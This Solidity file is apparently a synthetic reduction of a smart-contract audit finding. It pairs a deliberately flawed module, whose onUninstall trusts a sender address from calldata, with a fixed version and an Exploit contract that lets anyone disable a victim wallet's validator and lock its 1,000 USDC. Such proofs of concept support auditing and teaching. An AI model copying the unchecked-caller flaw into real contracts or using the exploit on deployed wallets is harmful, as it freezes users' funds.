// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot CredibleAccountModule — C-06 (Shieldify, finding 61408)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: onUninstall reads `sender` from calldata and never checks
    msg.sender. Anyone can clear validatorInitialized on any wallet that has
    the module installed. The wallet then refuses execute(), so the owner's
    1,000 USDC can no longer move. */

uint256 constant MODULE_TYPE_VALIDATOR = 1;

enum HookType {
    GLOBAL
}

struct InitFlag {
    bool validatorInitialized;
    bool hookInitialized;
}

contract Usdc {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HookMultiPlexer {
    function hasHook(address, address, HookType) external pure returns (bool) {
        return true;
    }
}

interface IHookLens {
    function getActiveHook() external view returns (address);
}

contract CredibleAccountModule {
    error CredibleAccountModule_InvalidOnUnInstallData(address wallet);
    error CredibleAccountModule_HookMultiplexerIsNotInstalled();
    error CredibleAccountModule_NotAddedToHookMultiplexer();
    error CredibleAccountModule_InvalidModuleType();

    HookMultiPlexer public immutable hookMultiPlexer;
    mapping(address => InitFlag) public moduleInitialized;
    mapping(address => address[]) internal walletSessionKeys;
    address public uninstalledFrom;

    constructor(address mux) {
        hookMultiPlexer = HookMultiPlexer(mux);
    }

    function onInstall(bytes calldata data) external {
        uint256 moduleType = abi.decode(data, (uint256));
        if (moduleType == MODULE_TYPE_VALIDATOR) {
            address active = IHookLens(msg.sender).getActiveHook();
            if (active != address(hookMultiPlexer)) {
                revert CredibleAccountModule_HookMultiplexerIsNotInstalled();
            }
            bool hooked = hookMultiPlexer.hasHook(msg.sender, address(this), HookType.GLOBAL);
            if (!hooked) {
                revert CredibleAccountModule_NotAddedToHookMultiplexer();
            }
            moduleInitialized[msg.sender].validatorInitialized = true;
        } else {
            revert CredibleAccountModule_InvalidModuleType();
        }
    }

    function onUninstall(bytes calldata data) external {
        if (data.length < 32) {
            revert CredibleAccountModule_InvalidOnUnInstallData(msg.sender);
        }
        uint256 moduleType;
        address sender;
        assembly {
            moduleType := calldataload(data.offset)
        }
        // @> VULN: sender is taken from calldata and never compared to msg.sender
        assembly { sender := calldataload(add(data.offset, 32)) }
        if (moduleType == MODULE_TYPE_VALIDATOR) {
            address active = IHookLens(sender).getActiveHook();
            if (active != address(hookMultiPlexer)) {
                revert CredibleAccountModule_HookMultiplexerIsNotInstalled();
            }
            bool hooked = hookMultiPlexer.hasHook(sender, address(this), HookType.GLOBAL);
            if (!hooked) {
                revert CredibleAccountModule_NotAddedToHookMultiplexer();
            }
            address[] memory sessionKeys = walletSessionKeys[msg.sender];
            uint256 keyCount = sessionKeys.length;
            require(keyCount == 0, "caller session keys");
            delete walletSessionKeys[sender];
            moduleInitialized[sender].validatorInitialized = false;
            uninstalledFrom = sender;
        } else {
            revert CredibleAccountModule_InvalidModuleType();
        }
    }

    function isInitialized(address smartAccount) external view returns (bool) {
        return moduleInitialized[smartAccount].validatorInitialized;
    }
}

contract CredibleAccountModuleFixed {
    error CredibleAccountModule_InvalidOnUnInstallData(address wallet);
    error SenderMismatch(address caller, address claimed);

    HookMultiPlexer public immutable hookMultiPlexer;
    mapping(address => InitFlag) public moduleInitialized;

    constructor(address mux) {
        hookMultiPlexer = HookMultiPlexer(mux);
    }

    function onInstall(bytes calldata data) external {
        uint256 moduleType = abi.decode(data, (uint256));
        if (moduleType == MODULE_TYPE_VALIDATOR) {
            address active = IHookLens(msg.sender).getActiveHook();
            require(active == address(hookMultiPlexer), "hook");
            moduleInitialized[msg.sender].validatorInitialized = true;
        }
    }

    function onUninstall(bytes calldata data) external {
        if (data.length < 32) {
            revert CredibleAccountModule_InvalidOnUnInstallData(msg.sender);
        }
        uint256 moduleType;
        address sender;
        assembly {
            moduleType := calldataload(data.offset)
            sender := calldataload(add(data.offset, 32))
        }
        if (sender != msg.sender) {
            revert SenderMismatch(msg.sender, sender);
        }
        if (moduleType == MODULE_TYPE_VALIDATOR) {
            moduleInitialized[sender].validatorInitialized = false;
        }
    }

    function isInitialized(address smartAccount) external view returns (bool) {
        return moduleInitialized[smartAccount].validatorInitialized;
    }
}

contract VictimWallet is IHookLens {
    CredibleAccountModule public module;
    address public owner;
    Usdc public token;
    address public mux;
    uint256 public executions;

    constructor(CredibleAccountModule m, address o, Usdc t, address mux_) {
        module = m;
        owner = o;
        token = t;
        mux = mux_;
    }

    function getActiveHook() external view returns (address) {
        return mux;
    }

    function installValidator() external {
        require(msg.sender == owner, "not owner");
        module.onInstall(abi.encode(MODULE_TYPE_VALIDATOR));
    }

    function execute(address to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        require(module.isInitialized(address(this)), "validator uninstalled");
        executions = executions + 1;
        if (amount > 0) {
            token.transfer(to, amount);
        }
    }
}

contract FixedWallet is IHookLens {
    CredibleAccountModuleFixed public module;
    address public owner;
    Usdc public token;
    address public mux;
    uint256 public executions;

    constructor(CredibleAccountModuleFixed m, address o, Usdc t, address mux_) {
        module = m;
        owner = o;
        token = t;
        mux = mux_;
    }

    function getActiveHook() external view returns (address) {
        return mux;
    }

    function installValidator() external {
        require(msg.sender == owner, "not owner");
        module.onInstall(abi.encode(MODULE_TYPE_VALIDATOR));
    }

    function execute(address to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        require(module.isInitialized(address(this)), "validator uninstalled");
        executions = executions + 1;
        if (amount > 0) {
            token.transfer(to, amount);
        }
    }
}

contract Owner {
    function install(VictimWallet w) external {
        w.installValidator();
    }

    function execute(VictimWallet w, address to, uint256 amount) external {
        w.execute(to, amount);
    }

    function installFixed(FixedWallet w) external {
        w.installValidator();
    }

    function executeFixed(FixedWallet w, address to, uint256 amount) external {
        w.execute(to, amount);
    }
}

contract Exploit {
    uint256 public constant LOCKED = 1_000_000_000;

    Usdc public token;
    HookMultiPlexer public mux;
    CredibleAccountModule public module;
    Owner public owner;
    VictimWallet public wallet;
    bool public executeReverted;
    uint256 public stuck;

    constructor() {
        token = new Usdc();
        mux = new HookMultiPlexer();
        module = new CredibleAccountModule(address(mux));
        owner = new Owner();
        wallet = new VictimWallet(module, address(owner), token, address(mux));
        token.mint(address(this), LOCKED);
    }

    function run() external {
        token.transfer(address(wallet), LOCKED);
        owner.install(wallet);
        owner.execute(wallet, address(owner), 0);
        require(wallet.executions() == 1, "owner could not execute before uninstall");
        require(module.isInitialized(address(wallet)), "validator not installed");
        bytes memory payload = abi.encode(MODULE_TYPE_VALIDATOR, address(wallet));
        module.onUninstall(payload);
        require(module.uninstalledFrom() == address(wallet), "wallet was not the calldata sender");
        require(module.isInitialized(address(wallet)) == false, "validator still installed");
        (bool ok,) = address(owner).call(
            abi.encodeWithSelector(Owner.execute.selector, wallet, address(owner), LOCKED)
        );
        executeReverted = ok == false;
        stuck = token.balanceOf(address(wallet));
        require(executeReverted, "owner execute still succeeded");
        require(stuck == LOCKED, "1000 USDC did not stay in the wallet");
        require(token.balanceOf(address(owner)) == 0, "owner received tokens");
    }
}
